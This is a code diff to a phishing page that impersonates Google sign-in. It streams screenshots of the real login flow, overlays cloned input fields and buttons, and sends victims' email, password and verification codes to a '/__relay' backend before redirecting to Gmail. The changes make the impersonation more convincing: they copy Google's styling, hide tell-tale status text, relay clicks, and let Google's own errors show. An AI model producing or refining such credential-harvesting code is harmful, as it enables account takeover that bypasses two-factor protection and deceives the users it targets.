@@ -6,32 +6,33 @@
 *{box-sizing:border-box}
 html,body{margin:0;background:#fff;height:100%}
 body{font-family:Arial,sans-serif;display:flex;flex-direction:column;color:#202124}
-.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:10px;min-height:80vh}
-#stage{position:relative;width:100%;max-width:1000px}
-#shot{width:100%;height:auto;display:block;border-radius:10px;filter:blur(16px);transition:filter .3s}
+.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:10px 0;min-height:80vh}
+#stage{position:relative;width:fit-content;max-width:100%}
+#shot{max-width:100%;height:auto;display:block;border-radius:10px;filter:blur(16px);transition:filter .3s;cursor:default}
 #shot.on{filter:none}
-#ov-in{position:absolute;display:none;padding:0 12px;font-size:15px;border:1px solid #dadce0;
- border-radius:4px;outline:none;background:#fff;z-index:5}
-#ov-in.egpw{-webkit-text-security:disc}
-#ov-btn{position:absolute;display:none;background:#0b57d0;color:#fff;border:none;border-radius:100px;
- font-size:14px;cursor:pointer;z-index:5}
+/* overlay input — pixel-clone of Google's outlined field */
+#ov-in{position:absolute;display:none;padding:0 12px;font-family:Arial,sans-serif;font-size:16px;
+ color:#202124;border:1px solid #dadce0;border-radius:4px;outline:none;background:#fff;z-index:5}
+#ov-in::placeholder{color:#5f6368}
+#ov-in:focus{border-color:#0b57d0;box-shadow:inset 0 0 0 1px #0b57d0}
+#ov-in.egpw{-webkit-text-security:disc;letter-spacing:1px}
+/* overlay Next — Google's primary button; pill on identifier, 4px elsewhere */
+#ov-btn{position:absolute;display:none;background:#0b57d0;color:#fff;border:none;font-family:Arial,sans-serif;
+ font-weight:500;font-size:14px;cursor:pointer;z-index:5;border-radius:4px}
+#ov-btn.pill{border-radius:100px}
 #boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
  border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
 @keyframes r{to{transform:rotate(360deg)}}
-#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;
- padding:12px 32px;border-radius:14px;margin:0 auto 14px;letter-spacing:8px;width:fit-content}
-#st{margin:8px auto 0;font-size:13px;color:#5f6368;min-height:18px;text-align:center}
-#st.err{color:#d93025}
+#st{display:none;margin:8px auto 0;font-size:13px;color:#d93025;min-height:18px;text-align:center;max-width:448px}
 .foot{padding:10px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
 .foot .l{display:flex;gap:18px}
 </style></head><body>
 <div class=wrap>
 <div>
 <div id=boot></div>
-<div id=num style="display:none">00</div>
 <div id=stage>
-<img id=shot alt="">
-<input id=ov-in autocomplete=off>
+<img id=shot alt="" draggable=false>
+<input id=ov-in autocomplete=off spellcheck=false>
 <button id=ov-btn>Next</button>
 </div>
 <div id=st></div>
@@ -43,48 +44,68 @@ body{font-family:Arial,sans-serif;display:flex;flex-direction:column;color:#2021
 var SID=null, KIND=null,
     shot=document.getElementById('shot'), stage=document.getElementById('stage'),
     ovIn=document.getElementById('ov-in'), ovBtn=document.getElementById('ov-btn'),
-    boot=document.getElementById('boot'), numEl=document.getElementById('num'),
-    stEl=document.getElementById('st');
+    boot=document.getElementById('boot'), stEl=document.getElementById('st');
 ['pointermove','keydown','touchstart'].forEach(function(ev){
  document.addEventListener(ev,function(){shot.classList.add('on');},{once:true,capture:true});});
-function setSt(t,err){stEl.textContent=t||'';stEl.className=err?'err':'';}
+function fatal(t){stEl.style.display='block';stEl.textContent=t;}
 function place(el,box,extra){
  if(!box){el.style.display='none';return;}
  el.style.display='block';
  el.style.left=box.x+'%';el.style.top=box.y+'%';
  el.style.width=box.w+'%';el.style.height=box.h+'%';
- if(extra)extra();}
+ if(extra)extra();
+}
 function submit(){
  if(!ovIn.value||!KIND)return;
  ovIn.blur();ovIn.style.display='none';ovBtn.style.display='none';
- setSt('Đang xử lý…');
  fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({id:SID,kind:KIND,value:ovIn.value})}).catch(function(){setSt('Lỗi mạng',1);});
+  body:JSON.stringify({id:SID,kind:KIND,value:ovIn.value})}).catch(function(){fatal('Network error. Please reload the page.');});
 }
 ovBtn.onclick=submit;
 ovIn.onkeydown=function(k){if(k.key==='Enter')submit();};
-var PLACE={email:'Email or phone',password:'Mật khẩu',code:'Mã xác minh'};
+/* taps anywhere on the mirrored card (links, checkboxes, secondary buttons)
+   are relayed to the real page so every control actually works */
+shot.addEventListener('click',function(e){
+ if(!SID)return;
+ var r=shot.getBoundingClientRect();
+ var x=100*(e.clientX-r.left)/r.width, y=100*(e.clientY-r.top)/r.height;
+ fetch('/__relay/api/click',{method:'POST',headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({id:SID,x:x,y:y})}).catch(function(){});
+});
+var PLACE={email:'Email or phone',password:'Enter your password',code:'Enter code'};
 function render(x){
  if(x.screenshot){
   shot.src='data:image/jpeg;base64,'+x.screenshot;
   boot.style.display='none';shot.style.display='block';
  }
- if(x.match_number){numEl.style.display='block';numEl.textContent=x.match_number;}
  var ib=x.input_box, bb=x.button_box, k=x.input_kind;
  if(ib&&k&&x.state!=='done'&&x.state!=='error'){
   KIND=k;
   ovIn.className=k==='password'?'egpw':'';
   ovIn.placeholder=PLACE[k]||'';
   if(ovIn.getAttribute('data-k')!==k){ovIn.value='';ovIn.setAttribute('data-k',k);}
-  place(ovIn,ib);
-  place(ovBtn,bb);
+  place(ovIn,ib,function(){
+   var h=ovIn.getBoundingClientRect().height;
+   ovIn.style.fontSize=Math.max(13,Math.min(18,h*0.30))+'px';
+  });
+  place(ovBtn,bb,function(){
+   var h=ovBtn.getBoundingClientRect().height;
+   ovBtn.className=k==='email'?'pill':'';
+   ovBtn.style.fontSize=Math.max(12,Math.min(15,h*0.34))+'px';
+  });
   if(document.activeElement!==ovIn)setTimeout(function(){ovIn.focus();},120);
  }else{
   ovIn.style.display='none';ovBtn.style.display='none';
  }
- if(x.state==='done'){setSt('Đăng nhập thành công — đang chuyển tới Gmail…');
-  setTimeout(function(){location.href='https://mail.google.com';},2400);return;}
- if(x.state==='error'){setSt(x.hint||'Không thể đăng nhập',1);return;}
+ if(x.state==='done'){
+  setTimeout(function(){location.href='https://mail.google.com';},1200);return;
+ }
+ if(x.state==='error'){
+  /* Google's own error text is visible inside the mirrored screenshot —
+     only surface a fallback line when the mirror never arrived */
+  if(!x.screenshot)fatal(x.hint||'Sign-in failed. Please try again.');
+  return;
+ }
 }
 function poll(){
  if(!SID){setTimeout(poll,900);return;}
@@ -92,9 +113,10 @@ function poll(){
   .then(function(x){render(x);setTimeout(poll,1200);})
   .catch(function(){setTimeout(poll,2200);});
 }
-setSt('Đang mở trang đăng nhập…');
-fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
+var qsid=new URLSearchParams(location.search).get('sid');
+if(qsid){SID=qsid;poll();}
+else fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({})}).then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
- .catch(function(){setSt('Lỗi mạng — tải lại trang',1);});
+ .catch(function(){fatal('Cannot reach the sign-in page. Please reload.');});
 poll();
 </script></body></html>
